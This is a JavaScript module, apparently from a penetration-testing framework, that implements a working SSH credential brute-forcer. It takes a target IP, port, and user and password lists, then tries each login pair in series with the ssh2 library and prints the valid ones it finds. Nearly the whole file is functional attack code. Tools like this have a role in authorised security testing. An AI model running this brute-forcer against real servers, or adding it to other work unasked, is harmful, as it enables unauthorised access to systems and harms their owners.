/*
Copyright Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

'use strict';

var Connection  = require('ssh2'),
    async       = require('async'),
    lodash      = require('lodash'),
    
    printer = require('../utils/printer'),
    utils   = require('../utils/utils');


module.exports = (function () {
    
    return {
        
        info : {
            name        : 'sshBrute',
            description : 'Try to brute-force valid credentials for the SSH protocol',
            options     : {
                target : {
                    description  : 'IP address to brute-force',
                    defaultValue : '127.0.0.1',
                    type         : 'targetIp'
                },
                port : {
                    description  : 'Port of the server',
                    defaultValue : '22',
                    type         : 'port'
                },
                users : {
                    description  : 'User (or file with them) to test',
                    defaultValue : 'root',
                    type         : 'userPass'
                },
                passwords : {
                    description  : 'Password (or file with them) to test',
                    defaultValue : 'god',
                    type         : 'userPass'
                },
                userAsPass : {
                    description  : 'Test the same user as password for each one.',
                    defaultValue : 'yes',
                    type         : 'yesNo'
                },
                delay : {
                    description  : 'Delay between requests in ms.',
                    defaultValue : 0,
                    type         : 'positiveInt'
                },
                timeout : {
                    description  : 'Time to wait for the first response, in ms.',
                    defaultValue : 5000,
                    type         : 'positiveInt'
                }              
            }
        },
                
        run : function (options, callback) {
            var loginPairs  = utils.createLoginPairs(options.users, options.passwords, options.userAsPass),
                result      = [],
                indexCount  = 0, // User with delay to know in which index we are
                tmpUser;    
                        
            // We avoid to parallelize here to control the interval of the requests
            async.eachSeries(loginPairs, function (loginPair, asyncCb) {
                var conn = new Connection();

                function delayCb () {
                    conn.end();
                    if (indexCount === loginPairs.length) {
                        asyncCb();
                    } else {
                        setTimeout(asyncCb, options.delay);
                    }
                }

                indexCount += 1;
                
                conn.on('error', function (err) {
                    if (/Authentication failure/.test(err)) {
                        printer.infoHigh('Valid credentials NOT found for: ' +
                                        loginPair.user + ' | ' + loginPair.pass);
                        delayCb();
                    } else {
                        asyncCb(err);
                    }
                });

                conn.on('ready', function () {
                    result.push(loginPair);
                    printer.highlight('Valid credentials found: ' +
                                loginPair.user + ' | ' + loginPair.pass);
                    delayCb();
                });

                conn.connect({
                    host         : options.target,
                    port         : options.port,
                    username     : loginPair.user,
                    password     : loginPair.pass,
//                    // TODO: Add support
//                    privateKey: require('fs').readFileSync('/here/is/my/key')
                    readyTimeout : options.timeout
                });
            }, function (err) {
                callback(err, result);
            });
        }
	};
	
}());